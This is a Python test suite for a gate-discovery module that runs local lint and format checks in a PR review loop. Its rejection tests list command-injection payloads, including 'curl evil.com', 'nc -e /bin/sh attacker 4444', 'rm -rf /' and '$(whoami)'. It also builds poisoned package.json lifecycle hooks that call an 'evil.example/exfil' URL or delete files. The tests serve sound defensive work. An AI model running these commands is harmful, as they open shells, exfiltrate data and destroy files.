"""Tests for ``pdd.checkup_gates`` deterministic gate discovery + execution.

The gate module exists so ``pdd checkup --pr --review-loop`` cannot ship a
clean LLM verdict on top of a worktree that fails a fast, deterministic
local check (e.g. ``prettier --check``). The tests below pin every gate
the v1 discovery set is supposed to emit, and pin the runner-side
contract (timeout handling, output truncation, secret scrubbing,
artifact persistence).
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import patch


def _make_pkg_json(scripts: Dict[str, str]) -> str:
    return json.dumps({"name": "fake", "version": "0.0.0", "scripts": scripts})


def _git_init(worktree: Path) -> None:
    """Initialize a minimal git repo so ``git diff --check`` has something to scan."""
    subprocess.run(["git", "init", "-q"], cwd=worktree, check=True)
    subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
         "--allow-empty", "-m", "init", "-q"],
        cwd=worktree,
        check=True,
    )


class TestDiscoverGates:
    """``discover_gates`` inspects repo config and emits an allowlisted gate set."""

    def test_emits_git_diff_check_always(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_finds_prettier_check_from_package_json(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" in names
        gate = next(g for g in gates if g.name == "npm:format:check")
        assert gate.cmd[0] in {"npm", "yarn", "pnpm", "bun"}
        assert "format:check" in gate.cmd

    def test_skips_non_check_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format": "prettier --write ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format" not in names

    def test_skips_install_or_deploy_scripts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "preinstall": "npm install foo",
                    "deploy": "firebase deploy",
                    "start": "node server.js",
                    "build": "tsc -p .",
                    "publish": "npm publish",
                    "push": "git push",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        for forbidden in (
            "npm:preinstall",
            "npm:deploy",
            "npm:start",
            "npm:build",
            "npm:publish",
            "npm:push",
        ):
            assert forbidden not in names

    def test_skips_eslint_without_no_fix_flag(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"lint:check": "eslint --fix ."}),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:lint:check" not in names

    def test_emits_py_compile_for_changed_python_files(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "py-compile:a.py" in names
        gate = next(g for g in gates if g.name == "py-compile:a.py")
        # Iter-19 Finding 3: the gate MUST NOT write
        # ``__pycache__/*.pyc`` next to the source file. The argv
        # routes the syntax check through the builtin ``compile()``
        # so no bytecode is written to disk at all — neither
        # ``-B`` alone nor ``py_compile(..., cfile=os.devnull)`` are
        # sufficient (the former because py_compile writes
        # explicitly, the latter because py_compile uses an atomic
        # rename onto cfile which cannot target /dev/null).
        assert gate.cmd[:3] == [sys.executable, "-B", "-c"]
        assert "compile(" in gate.cmd[3]
        assert "py_compile" not in gate.cmd[3]
        assert gate.cmd[-1].endswith("a.py")

    def test_py_compile_does_not_write_pycache_to_worktree(
        self, tmp_path: Path
    ) -> None:
        """Iter-19 Finding 3 end-to-end: actually run the discovered
        gate against a valid .py file and confirm no ``__pycache__/``
        directory appears under the worktree afterwards. This guards
        against a future refactor that drops ``-B`` from the cmd
        without us noticing in unit tests that only inspect argv.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = [
            g for g in discover_gates(tmp_path, changed_files=("a.py",))
            if g.name == "py-compile:a.py"
        ]
        assert gates, "discovery should emit py-compile for a.py"
        artifacts = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts,
            round_number=1,
            mode="review",
        )
        assert results[0].exit_code == 0
        assert not (tmp_path / "__pycache__").exists()
        assert not list(tmp_path.glob("**/__pycache__"))

    def test_skips_py_compile_when_no_python_files_changed(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=("readme.md",))
        names = [g.name for g in gates]
        assert not any(n.startswith("py-compile:") for n in names)

    def test_skips_ruff_when_no_pyproject_config(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_emits_ruff_when_configured_and_binary_present(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value="/usr/bin/ruff"):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" in names

    def test_skips_ruff_when_configured_but_binary_missing(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\nline-length = 100\n", encoding="utf-8"
        )
        with patch("pdd.checkup_gates.shutil.which", return_value=None):
            gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = [g.name for g in gates]
        assert "ruff" not in names

    def test_user_extra_allow_is_honored(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(
            tmp_path, changed_files=(), extra_allow=("git-diff-check",)
        )
        names = [g.name for g in gates]
        assert "git-diff-check" in names

    def test_gates_use_list_form_no_shell(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        for gate in gates:
            assert isinstance(gate.cmd, list)
            for token in gate.cmd:
                assert isinstance(token, str)

    def test_script_rejects_shell_metacharacters(self) -> None:
        """Codex review iteration 1, Finding 1: ``npm run`` shells out, so
        any metacharacter in the script body chains. The allowlist MUST
        reject metacharacters even when the leading tool name is
        recognised (``prettier --check``).
        """
        from pdd.checkup_gates import _script_is_acceptable

        injected_payloads = [
            "prettier --check && curl evil.com",
            "prettier --check || rm -rf /",
            "prettier --check; echo p0wned",
            "prettier --check | tee /tmp/x",
            "prettier --check & sleep 9999",
            "prettier --check `whoami`",
            "prettier --check $(whoami)",
            "prettier --check ${HOME}",
            "prettier --check > /tmp/out",
            "prettier --check >> /tmp/out",
            "prettier --check < /etc/passwd",
            "prettier --check << EOF",
            "prettier --check\nrm -rf /",
            "curl evil.com",
            "wget evil.com",
            "nc -e /bin/sh attacker 4444",
            "bash -c 'evil'",
            "sh -c 'evil'",
            "eval 'echo bad'",
            "node -e 'process.exit(7)'",
        ]
        for payload in injected_payloads:
            assert _script_is_acceptable(payload) is False, (
                f"shell metachar payload {payload!r} must be rejected"
            )

    def test_script_accepts_legitimate_prettier_with_glob(self) -> None:
        """Positive sanity: a real prettier invocation with a glob and
        space-separated args must STILL be accepted — the metachar guard
        cannot be so wide it breaks normal scripts."""
        from pdd.checkup_gates import _script_is_acceptable

        assert _script_is_acceptable("prettier --check src/**/*.ts") is True
        assert _script_is_acceptable("prettier --check '.'") is True
        assert _script_is_acceptable(
            "prettier --check src/foo.ts src/bar.ts"
        ) is True
        assert _script_is_acceptable("tsc --noEmit") is True

    def test_discover_skips_npm_script_with_shell_metachars(
        self, tmp_path: Path
    ) -> None:
        """End-to-end: a poisoned ``package.json`` must NOT emit a gate."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {"format:check": "prettier --check && curl http://evil.example/"}
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_pre_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 2: a benign script must NOT be invoked when
        ``pre<name>``/``post<name>`` lifecycle hooks would also execute.
        npm/yarn/pnpm/bun fire those hooks around ``<runner> run <name>``,
        and discovery only validates the named script — so a malicious
        ``preformat:check`` would smuggle ``curl`` past the allowlist.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "format:check": "prettier --check .",
                    "preformat:check": "curl http://evil.example/exfil",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:format:check" not in names

    def test_discover_skips_npm_script_when_post_lifecycle_hook_present(
        self, tmp_path: Path
    ) -> None:
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json(
                {
                    "typecheck": "tsc --noEmit",
                    "posttypecheck": "rm -rf .",
                }
            ),
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "npm:typecheck" not in names

    def test_git_diff_check_uses_pr_range_when_base_ref_resolvable(
        self, tmp_path: Path
    ) -> None:
        """Iter-15 Finding 1: a committed whitespace failure on the PR
        branch must be caught even when the worktree is clean. The gate
        must run ``git diff --check <base>...HEAD``, not the plain
        ``git diff --check`` against unstaged worktree changes.
        """
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "feat", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref="main")
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert diff_gate.cmd == ["git", "diff", "--check", "main...HEAD"]

    def test_git_diff_check_falls_back_when_base_ref_unresolvable(
        self, tmp_path: Path
    ) -> None:
        """When no base ref verifies AND no ``main``/``master`` exists
        in the worktree (synthetic test repo on a feature branch with
        no remote), we keep the existing plain ``git diff --check`` so
        single-commit smoke tests still see a gate."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(
            ["git", "init", "-q", "-b", "feature-only"], cwd=tmp_path, check=True
        )
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(
            tmp_path,
            changed_files=(),
            base_ref="branch-that-does-not-exist",
        )
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert diff_gate.cmd == ["git", "diff", "--check"]

    def test_git_diff_check_falls_back_to_main_master_when_no_base_ref(
        self, tmp_path: Path
    ) -> None:
        """When no ``base_ref`` is supplied but a local ``main``/``master``
        exists (the default for ``git init``), discovery still uses it
        so the PR-range guarantee holds even when the caller forgot to
        thread ``pr_metadata['base_ref']`` through. This preserves the
        product invariant from issue #1092: a committed whitespace
        failure must be caught."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        gates = discover_gates(tmp_path, changed_files=())
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        # Either ``master...HEAD`` or ``main...HEAD`` depending on the
        # local ``init.defaultBranch`` — both satisfy the contract.
        assert diff_gate.cmd[:3] == ["git", "diff", "--check"]
        if len(diff_gate.cmd) > 3:
            assert diff_gate.cmd[3].endswith("...HEAD")

    def test_git_diff_check_accepts_fully_qualified_local_ref(
        self, tmp_path: Path
    ) -> None:
        """Iter-17 Finding 2: ``_refresh_pr_base_ref`` lands the PR base
        into ``refs/remotes/pdd-checkup/pr-<N>/base`` so it cannot
        collide with the operator's own ``origin`` tracking refs. The
        gate resolver MUST accept that fully-qualified ref directly
        (instead of trying ``origin/refs/...`` and falling through to
        the generic candidate set, which would silently drop the PR
        range)."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        # Manufacture the dedicated tracking ref that
        # ``_refresh_pr_base_ref`` would produce in production.
        local_ref = "refs/remotes/pdd-checkup/pr-1/base"
        subprocess.run(
            ["git", "update-ref", local_ref, "HEAD"],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "feat", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref=local_ref)
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        # The gate must run against the dedicated ref directly, not
        # ``origin/refs/...`` or a fallback like ``main...HEAD``.
        assert diff_gate.cmd == ["git", "diff", "--check", f"{local_ref}...HEAD"]

    def test_tsc_noemit_skipped_when_node_modules_typescript_absent(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3: tsc-noemit must NOT fire ``npx tsc`` when
        TypeScript isn't actually installed locally. Bare ``npx tsc``
        falls back to a registry download + install + exec when the
        local binary is missing, which violates the deterministic-local
        contract from issue #1092. Discovery must skip the gate in that
        case so the gate runner never gets a chance to network-install.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        # NOTE: no ``node_modules/typescript/bin/tsc`` on disk.
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "tsc-noemit" not in names

    def test_tsc_noemit_emitted_with_no_install_flag_when_locally_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3 inverse: once TypeScript IS installed
        locally, the gate fires — and it must pass ``--no-install`` so
        a future npx rewire still cannot reach the registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        if "tsc-noemit" in names:  # only when ``npx`` is on PATH
            gate = next(g for g in gates if g.name == "tsc-noemit")
            assert "--no-install" in gate.cmd


class TestRunGates:
    """``run_gates`` executes each discovered gate and persists artifacts."""

    def test_records_exit_code_and_persists_artifact(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-ok",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0
        manifest = artifacts_dir / "round-1-review-gates.json"
        assert manifest.exists()
        payload = json.loads(manifest.read_text(encoding="utf-8"))
        assert payload[0]["exit_code"] == 0
        assert payload[0]["gate"]["name"] == "echo-ok"
        per_gate = artifacts_dir / "round-1-review-gate-echo-ok.txt"
        assert per_gate.exists()

    def test_failure_exit_code_recorded(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-fail",
                cmd=[sys.executable, "-c", "import sys; sys.exit(7)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code == 7

    def test_truncates_oversize_output(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Emit ~200KB of stdout; the runner truncates to ~10KB.
        script = (
            "import sys; sys.stdout.write('A' * 200000); sys.exit(1)"
        )
        gates = [
            Gate(
                name="bigout",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # ~10KB cap, generously bound to allow a small marker like "[truncated]".
        assert len(results[0].stdout_excerpt) <= 12000
        assert results[0].stdout_excerpt  # not empty

    def test_handles_timeout(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Long sleep with a 0.1s timeout: runner must record exit_code=None
        # plus a non-empty error rather than block the loop.
        script = "import time; time.sleep(60)"
        gates = [
            Gate(
                name="hang",
                cmd=[sys.executable, "-c", script],
                source="<test>",
                timeout=0.1,
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        lowered = results[0].error.lower()
        assert "timeout" in lowered or "timed out" in lowered

    def test_handles_missing_binary(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="ghost",
                cmd=["this-binary-does-not-exist-xyz-1092"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        assert results[0].error  # non-empty

    def test_scrubs_secrets_in_excerpts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Use ``Authorization: Bearer …`` which the existing scrubber regex
        # recognises, so the runner must consult the loop's scrubber before
        # persisting the excerpt.
        script = (
            "import sys; "
            "sys.stderr.write('error: Authorization: Bearer sk-abcdefghijklmnopqr\\n'); "
            "sys.exit(1)"
        )
        gates = [
            Gate(
                name="leakage",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "[REDACTED]" in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stdout_excerpt

    def test_runs_with_ci_env_and_no_color(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # The runner must inject CI=1, NO_COLOR=1, FORCE_COLOR=0 so deterministic
        # gates emit non-interactive output. Probe via a dump-env gate.
        script = (
            "import os, sys; "
            "sys.stdout.write("
            "f\"CI={os.environ.get('CI')}|"
            "NO_COLOR={os.environ.get('NO_COLOR')}|"
            "FORCE_COLOR={os.environ.get('FORCE_COLOR')}\""
            "); sys.exit(0)"
        )
        gates = [
            Gate(
                name="env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "CI=1" in results[0].stdout_excerpt
        assert "NO_COLOR=1" in results[0].stdout_excerpt
        assert "FORCE_COLOR=0" in results[0].stdout_excerpt

    def test_strips_pdd_env_so_gate_does_not_inherit_loop_state(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Set a PDD_* env that must NOT leak into the gate process.
        monkeypatch.setenv("PDD_FAKE_SECRET", "must-not-appear")
        script = (
            "import os, sys; "
            "sys.stdout.write(os.environ.get('PDD_FAKE_SECRET', '<unset>')); "
            "sys.exit(0)"
        )
        gates = [
            Gate(
                name="pdd-env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].stdout_excerpt.strip() == "<unset>"

    def test_uses_worktree_as_cwd(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        script = "import os, sys; sys.stdout.write(os.getcwd()); sys.exit(0)"
        gates = [
            Gate(
                name="cwd-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # tmp_path may be a symlink on macOS; resolve both sides for comparison.
        emitted = Path(results[0].stdout_excerpt.strip()).resolve()
        assert emitted == tmp_path.resolve()

    def test_run_gates_handles_artifact_write_failure_as_gate_result(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """Codex review iteration 1, Finding 3: an artifact persistence error
        must not crash ``run_gates`` or lose the result row — it must be
        recorded as a runner-side failure on that specific gate with a
        useful ``error`` field so the audit trail remains visible.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
            gates_mod.Gate(
                name="ok-gate-2",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            # Fail only on the per-gate text artifact for the first gate.
            if "round-1-review-gate-ok-gate.txt" in self.name:
                raise PermissionError("disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)

        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 2
        # The first gate gets a runner-error marker on the persistence
        # failure, even though the subprocess itself exited 0.
        first = results[0]
        assert first.exit_code is None
        assert first.error and (
            "permissionerror" in first.error.lower() or "disk full" in first.error.lower()
        )
        # The second gate still records its successful run.
        second = results[1]
        assert second.exit_code == 0

    def test_run_gates_survives_manifest_write_failure(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """The manifest is best-effort: when it fails, the call returns
        every collected ``GateResult`` and does not raise.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            if self.name.endswith("review-gates.json"):
                raise PermissionError("manifest disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)
        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0


class TestGateResultsToFindings:
    """``gate_results_to_findings`` converts failing gates to ``ReviewFinding``."""

    def test_failed_gate_becomes_blocker_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
            required_fix_hint="Run prettier --write . locally and commit.",
        )
        result = GateResult(
            gate=gate,
            exit_code=1,
            stdout_excerpt="Code style issues found in 2 files.",
            stderr_excerpt="",
            duration_seconds=0.5,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([result], round_number=2)
        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "blocker"
        assert finding.reviewer == "gate:prettier-check"
        assert finding.area == "deterministic-gate"
        assert (
            "prettier --check" in finding.required_fix.lower()
            or "prettier --write" in finding.required_fix.lower()
        )
        evidence_lower = finding.evidence.lower()
        assert "exit code 1" in evidence_lower or "exit_code=1" in evidence_lower
        assert finding.location == "package.json:scripts.format:check"
        assert finding.round_number == 2
        assert finding.status == "open"

    def test_passed_gates_skipped(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="ok", cmd=["true"], source="<test>")
        passing = GateResult(
            gate=gate,
            exit_code=0,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.01,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([passing], round_number=1)
        assert findings == []

    def test_runner_side_error_becomes_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="hang", cmd=["sleep", "10"], source="<test>")
        result = GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.1,
            started_at_iso="2025-01-01T00:00:00Z",
            error="timed out after 0.1s",
        )
        findings = gate_results_to_findings([result], round_number=1)
        assert len(findings) == 1
        assert findings[0].severity == "blocker"
        evidence_lower = findings[0].evidence.lower()
        assert "timed out" in evidence_lower or "timeout" in evidence_lower

    def test_dedup_key_is_stable_across_rounds(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="A",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:00Z",
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="B",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:01Z",
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key

    def test_gate_runner_error_finding_key_stable_across_rounds_with_volatile_error(
        self,
    ) -> None:
        """Codex review iteration 2, Finding 1: the runner-error finding's
        ``finding`` text MUST NOT embed ``result.error`` because that field
        carries volatile detail (paths, exception ``[Errno N]`` codes, etc.)
        that varies across rounds. ``ReviewFinding.key`` is built from
        ``severity|location|finding|required_fix``; an embedded volatile
        ``error`` breaks the dedup contract documented in
        ``pdd/prompts/checkup_gates_python.prompt`` and tested by
        ``test_dedup_key_is_stable_across_rounds`` for the
        exit_code != 0 branch.
        """
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="persist-fail",
            cmd=["true"],
            source="<test>",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:00Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-1-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:05Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-2-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key, (
            "runner-error finding keys MUST match across rounds despite "
            "round-specific paths in ``result.error``; otherwise the loop "
            "produces a duplicate finding row every round.\n"
            f"r1.key={r1[0].key!r}\nr2.key={r2[0].key!r}"
        )
        # The volatile error text MUST still appear in evidence so the
        # operator can still see the actual failure detail.
        assert "PermissionError" in r1[0].evidence
        assert "/tmp/round-1-review-gate-persist-fail.txt" in r1[0].evidence
